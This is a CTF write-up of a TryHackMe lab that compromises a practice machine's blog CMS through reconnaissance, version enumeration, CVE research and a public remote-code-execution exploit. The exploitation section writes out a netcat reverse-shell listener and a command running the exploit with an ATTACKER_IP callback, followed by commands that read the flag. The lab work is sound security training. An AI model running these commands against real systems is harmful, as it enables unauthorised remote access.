# Vulnerability Capstone


## Introduction

This write-up documents the security audit performed on **Ackme Support Incorporated's** (tryhackme's target machine) blog platform. The goal was to identify vulnerabilities in the **CMS** before public deployment using **vulnerability research** and **exploit databases**.

---

## Application Identification

### Objective
Identify what application is running on the target machine.

### Methodology
- Accessed the target website via browser
- Checked the homepage, footer, and source code
- Looked for application branding and version info

### Steps
1. Navigate to `http://MACHINE_IP`
2. Inspect the page footer
3. Check page source for CMS identification

**Result**: Successfully identified the CMS name.

---

## Version Enumeration

### Objective
Determine the exact version number of the application.

### Methodology
- Examined footer and admin pages
- Checked source code and meta tags
- Looked for version info in accessible paths

### Steps
1. Review homepage footer carefully
2. Navigate to login/admin pages if available
3. Check `/admin` or `/dashboard` endpoints
4. Inspect HTML source for version tags

**Result**: Found the exact **CMS version** number.

---

## CVE Research

### Objective
Find the **CVE number** for the remote code execution vulnerability.

### Methodology
Used multiple vulnerability databases to research known exploits:
- **NVD (National Vulnerability Database)**
- **Exploit-DB**
- **CVE Details**

### Steps
1. Searched **NVD** for the CMS name and version
2. Filtered by **RCE (Remote Code Execution)** vulnerabilities
3. Cross-referenced with **Exploit-DB**
4. Identified the specific **CVE** number

**Result**: Located the **CVE** for remote code execution vulnerability.

---

## Exploitation & Flag Retrieval

### Objective
Exploit the vulnerability and retrieve the flag from `/home/ubuntu`.

### Methodology
- Located public exploit on **GitHub**
- Set up **reverse shell** listener
- Executed exploit and gained access

### Exploit Setup

**Step 1: Download Exploit**
- Found working Python exploit on GitHub
- Downloaded the script: `Fuel-Updated.py`

**Step 2: Prepare Listener**
Open a terminal and start **Netcat** listener:
```bash
nc -nlvp 4444
```

**Step 3: Gather Information**
- Target IP: From TryHackMe machine deployment
- Your IP: Use `ip a` or `ifconfig` to find
- Port: `4444` (must match listener)

### Execution

**Run the exploit:**
```bash
python3 Fuel-Updated.py http://MACHINE_IP ATTACKER_IP 4444
```

**Parameters:**
- First: Target URL
- Second: Your machine IP
- Third: Listening port

**Note**: This exploit worked without modification. Some exploits may require editing hardcoded values in the script.

### Post-Exploitation

**Step 1: Verify Access**
Once the reverse shell connected:
```bash
whoami
```

**Step 2: Navigate to Target Directory**
```bash
cd /home/ubuntu
ls -la
```

**Step 3: Retrieve Flag**
```bash
cat flag.txt
```

**Result**: Successfully retrieved the flag.

## Summary

**Attack Chain:**
1. **Reconnaissance** → Identified CMS name
2. **Enumeration** → Found version number
3. **Research** → Located CVE for RCE vulnerability
4. **Exploitation** → Executed public exploit
5. **Access** → Gained shell and retrieved flag

**Key Tools Used:**
- Web browser (reconnaissance)
- **NVD/Exploit-DB** (vulnerability research)
- **GitHub** (exploit sourcing)
- **Netcat** (reverse shell listener)
- **Python** (exploit execution)
